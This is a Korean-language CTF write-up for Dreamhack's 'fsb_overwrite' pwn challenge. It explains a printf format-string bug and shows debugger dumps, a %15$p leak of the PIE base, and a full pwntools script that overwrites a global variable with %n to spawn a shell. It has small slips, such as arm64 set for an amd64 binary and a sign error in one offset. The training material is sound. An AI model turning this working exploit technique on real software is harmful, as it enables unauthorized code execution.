# Format String Bug - Dreamhack
## Challenge Info
- Date: YYYY-MM-DD
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy/medium/hard
- Points: 1
- Provided Files: fsb_overwrite.c, fsb_overwrite(ELF)
- tools:
## Brief Description
Exploit Tech: Format String Bug에서 실습하는 문제입니다.
## Initial Analysis
### Environment
``` sh
checksec fsb_overwrite
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
### Code
``` c
// Name: fsb_overwrite.c
// Compile: gcc -o fsb_overwrite fsb_overwrite.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void get_string(char *buf, size_t size) {
  ssize_t i = read(0, buf, size);
  if (i == -1) {
    perror("read");
    exit(1);
  }
  if (i < size) {
    if (i > 0 && buf[i - 1] == '\n') i--;
    buf[i] = 0;
  }
}

int changeme;

int main() {
  char buf[0x20];
  
  setbuf(stdout, NULL);
  
  while (1) {
    get_string(buf, 0x20);
    printf(buf);
    puts("");
    if (changeme == 1337) {
      system("/bin/sh");
    }
  }
}
```
## Vulnerability
### FSB(Format String Bug)
``` c
printf(buf);
```
`buf`는 사용자가 입력한 값이 들어가고 어떠한 검증/필터링 없이 `printf` 함수의 인자로 사용된다.  
## Exploit
### Strategy
PIE가 활성화 되어있어, PIE base 주소를 알아야 `changeme`를 덮어쓸 수 있다. 따라서 첫 번째로 PIE base 주소를 알아내고, `changeme`의 offset과 더하여 `changeme`의 주소를 알아낸 후 1337을 해당 주소에 덮어쓰면 공격에 성공할 수 있다.  
### Exploitation Steps
``` sh
$ ./fsb_overwrite
AAAAAAAA %x %x %x %x %x %x %x %x %x %x
AAAAAAAA ad5f7c20 20 c1a077e2 c1b0ef10 c1b2c040 41414141 20782520 78252078
 ad5f7c20 6
```
RDI, RSI, RDX, RCX, R8, R9, [RSP], [RPS+0x8], [RPS+0x10]...  
AAAAAAAA가 6번째 인자로 받는 것을 확인할 수 있다. RDI에는 포맷 문자열이 들어가기 때문에 `printf` 입장에서 RSI부터 인덱스 1번으로 시작한다.  
``` sh
pwndbg> disassemble main
Dump of assembler code for function main:
   0x0000555555555293 <+0>:     endbr64
   0x0000555555555297 <+4>:     push   rbp
   0x0000555555555298 <+5>:     mov    rbp,rsp
=> 0x000055555555529b <+8>:     sub    rsp,0x30
   0x000055555555529f <+12>:    mov    rax,QWORD PTR fs:0x28
   0x00005555555552a8 <+21>:    mov    QWORD PTR [rbp-0x8],rax
```
`main`의 시작 주소는 `0x0000555555555293`다. `main`의 시작 주소를 심볼로 활용하면 PIE base를 구할 수 있다.
``` sh
pwndbg> x/32gx $rsp
0x7fffffffded0: 0x00000000646f6f67      0x000000001f8bfbff
0x7fffffffdee0: 0x00007fffffffe279      0x0000000000000064
0x7fffffffdef0: 0x0000000000001000      0xf1612d93200daf00
0x7fffffffdf00: 0x0000000000000001      0x00007ffff7db3d90
0x7fffffffdf10: 0x0000000000000000      0x0000555555555293
0x7fffffffdf20: 0x00000001ffffe000      0x00007fffffffe018
0x7fffffffdf30: 0x0000000000000000      0x887fbc4234a2d361
0x7fffffffdf40: 0x00007fffffffe018      0x0000555555555293
0x7fffffffdf50: 0x0000555555557d90      0x00007ffff7ffd040
0x7fffffffdf60: 0x778043bd8a80d361      0x778053f44e28d361
0x7fffffffdf70: 0x00007fff00000000      0x0000000000000000
0x7fffffffdf80: 0x0000000000000000      0x0000000000000000
0x7fffffffdf90: 0x0000000000000000      0xf1612d93200daf00
0x7fffffffdfa0: 0x0000000000000000      0x00007ffff7db3e40
0x7fffffffdfb0: 0x00007fffffffe028      0x0000555555557d90
0x7fffffffdfc0: 0x00007ffff7ffe2e0      0x0000000000000000
```
pwndbg에서 `printf` 직전에 breakpoint 설정 후, "good" 입력 이후, `rsp`를 출력해본 결과, `[rsp]`에 "good"이 저장된 것을 확인할 수 있다. 이때 `[rsp+0x48]` 위치에 `0x0000555555555293`가 저장되어 있다. 
``` sh
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
    0x555555554000     0x555555555000 r--p     1000       0 fsb_overwrite
    0x555555555000     0x555555556000 r-xp     1000    1000 fsb_overwrite
    0x555555556000     0x555555557000 r--p     1000    2000 fsb_overwrite
    0x555555557000     0x555555558000 r--p     1000    2000 fsb_overwrite
    0x555555558000     0x555555559000 rw-p     1000    3000 fsb_overwrite
    0x7ffff7d87000     0x7ffff7d8a000 rw-p     3000       0 [anon_7ffff7d87]
    0x7ffff7d8a000     0x7ffff7db2000 r--p    28000       0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7db2000     0x7ffff7f47000 r-xp   195000   28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f47000     0x7ffff7f9f000 r--p    58000  1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f9f000     0x7ffff7fa0000 ---p     1000  215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7fa0000     0x7ffff7fa4000 r--p     4000  215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7fa4000     0x7ffff7fa6000 rw-p     2000  219000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7fa6000     0x7ffff7fb3000 rw-p     d000       0 [anon_7ffff7fa6]
    0x7ffff7fbb000     0x7ffff7fbd000 rw-p     2000       0 [anon_7ffff7fbb]
    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000       0 [vvar]
    0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000       0 [vdso]
    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000       0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000    2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000   2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000   37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000   39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffde000     0x7ffffffff000 rw-p    21000       0 [stack]
```
해당 값은 fsb_overwrite 바이너리가 매핑된 영역에 포함되는 주소(main의 시작 주소이므로 당연함)이므로 이 주소를 이용하면 PIE 베이스 주소를 구할 수 있다. 
``` sh
pwndbg> p/x 0x555555555293 - 0x555555554000
$1 = 0x1293
```
`[RSP-0x48]`에 저장되어 있는 (main 시작)주소와 PIE 베이스 주소 간의 오프셋은 0x1293다. `[RSP-0x48]`은 포맷 스트링의 15번째 인자이므로, `%15$p`로 읽을 수 있다.  
``` sh
$ readelf -s fsb_overwrite | grep changeme
    40: 000000000000401c     4 OBJECT  GLOBAL DEFAULT   26 changeme
```
`%15$p`를 입력해서 출력한 주소의 값에서 `0x1293`을 빼면 PIE 베이스 주소가 된다. PIE 베이스 주소에 `changeme`의 오프셋을 더하면 `changeme`의 주소를 구할 수 있다.  
### Stack Frame of main
| Variable Name | Offset from RBP |
| --- | --- |
| ra | 0x8 |
| rbp |  |
| dummy | -x10 |
| buf | -0x30 |
### payload
``` python
from pwn import *

p = remote('host8.dreamhack.games', 17489)
context.arch = "arm64"

elf = ELF('./fsb_overwrite')

# changeme addr leak
p.sendline(b'%15$p')
leaked = int(p.recvline()[:-1], 16)
log.info(f'leaked: {leaked}')
PIE_base = leaked - 0x1293
changeme = PIE_base + elf.symbols['changeme']
log.info(f'PIE_base: {PIE_base}')
log.info(f'changeme: {changeme  }')

# payload
payload = b''
payload += b'%1337c' 
payload += b'%8$n' 
payload += b'A' * 6 # 8의 배수를 위한 padding, 10 + 6 = 16(0x10)
payload += p64(changeme) # 16byte 뒤 8번째 인자
p.sendline(payload)
# low -> high
# %1337c%8 $nAAAAAA chageme_addr
# [RSP], [RSP+0x8], [RSP+0x10]

# interactive
p.interactive()
```
